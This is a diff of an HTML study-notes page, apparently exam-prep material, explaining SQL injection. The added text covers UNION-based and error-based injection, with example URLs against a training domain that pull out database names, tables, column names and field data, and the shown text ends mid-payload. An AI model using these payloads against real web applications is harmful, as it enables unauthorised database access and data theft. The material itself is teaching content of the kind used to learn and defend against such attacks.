@@ -9,5 +9,24 @@
 <p>The query will always return FALSE because 1 never equals 0; Attackers try to obtain a TRUE result by injecting 1=1</p>
 <p><i>shop.com/items.php?id=101 AND 1=1</i> -> <i>SELECT * FROM ITEMS WHERE ID = 101 AND 1=1</i></p>
 <p>Finally, the shopping web application returns the original items page. With this result, an attacker determines that the above URL is vulnerable to a blind SQL injection attack.</p>
-<h2>Hide malicious files</h2>
-<p>Hiding files in NTF
+
+<h1>Launch SQL Injection Attacks</h1>
+<p>After information gathering and vulnerability detection, the attacker tries to perform different types of SQL injection attacks</p>
+<h2>UNION SQL Injection</h2>
+<p>The attacker uses the UNION clause to concatenate a malicious query with the original query. An attacker checks for this vulnerability by adding a tick at the end of a <b>.php?id=</b>. If it comes 
+back with a MySQL error, the site is most likely vulnerable to <b>UNION SQL injection</b>. The attacker then proceeds to use ORDER BY to find the columns and finally uses the <b>UNION ALL SELECT</b> command.</p>
+<h2>Extract Database Name</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,DB_NAME,3,4--</i> -> DB_NAME returned from server</p>
+<h2>Extract Database Tables</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1, TABLE_NAME,3,4 from sysobjects where xtype=char(85) --</i> -> EMPLOYEE_TABLE returned from server</p>
+<h2>Extract Table Column Names</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1, column_name,3,4 from DB_NAME.information_schema.columns where table _name = 'EMPLOYEE_TABLE' --</i></p>
+<h2>Extract 1st Field Data</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --</i> -> FIELD 1 VALUE returned from the server</p>
+
+<h2>Error Based SQL Injection</h2>
+<p>Database level error messages disclosed by an application to build a vulnerability exploit request.</p>
+<h2>Extract Database Name</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 OR 1=convert(int,(DB_NAME))--</i> -> Syntax error converting the nvarchar value DB_NAME into a column of data type int</p>
+<h2>Extract 1st Database Table</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 OR 1=convert</i></p>
